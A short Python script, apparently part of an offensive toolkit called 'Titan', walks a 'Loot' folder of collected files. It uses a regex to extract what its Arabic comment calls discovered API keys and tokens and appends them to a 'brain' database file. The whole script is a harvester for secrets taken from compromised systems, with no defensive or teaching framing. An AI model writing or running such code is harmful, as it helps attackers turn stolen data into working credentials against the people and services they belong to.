import os, re

LOOT_PATH = "Data_Vault/Loot"
BRAIN_FILE = "Data_Vault/titan_brain.db"

def feed_titan():
    print("[🧬] Titan is feeding on fresh data...")
    if not os.path.exists(LOOT_PATH): return
    
    for root, dirs, files in os.walk(LOOT_PATH):
        for file in files:
            with open(os.path.join(root, file), 'r', errors='ignore') as f:
                data = f.read()
                # استخراج مفاتيح الـ API والـ Tokens المكتشفة
                tokens = re.findall(r'([a-zA-Z0-9_-]{24,})', data)
                with open(BRAIN_FILE, "a") as brain:
                    for t in tokens: brain.write(t + "\n")
    print(f"[🔥] Brain updated with new patterns from Loot.")

if __name__ == "__main__":
    feed_titan()
